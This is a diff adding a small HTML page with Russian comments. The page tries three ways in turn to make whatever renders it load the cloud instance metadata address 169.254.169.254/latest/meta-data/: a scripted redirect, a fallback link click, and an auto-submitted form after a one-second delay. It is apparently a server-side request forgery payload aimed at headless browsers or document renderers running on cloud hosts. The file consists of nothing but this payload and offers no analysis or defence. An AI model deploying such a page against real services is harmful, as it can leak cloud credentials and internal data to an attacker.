@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <a id="metaLink" href="http://169.254.169.254/latest/meta-data/" target="_blank">Click if not redirected</a>
+    <script>
+        // Пробуем все методы
+        try {
+            window.location.href = 'http://169.254.169.254/latest/meta-data/';
+        } catch(e) {
+            document.getElementById('metaLink').click();
+        }
+        
+        // Форма
+        setTimeout(() => {
+            const form = document.createElement('form');
+            form.action = 'http://169.254.169.254/latest/meta-data/';
+            form.method = 'GET';
+            form.target = '_blank';
+            document.body.appendChild(form);
+            form.submit();
+        }, 1000);
+    </script>
+</body>
+</html>
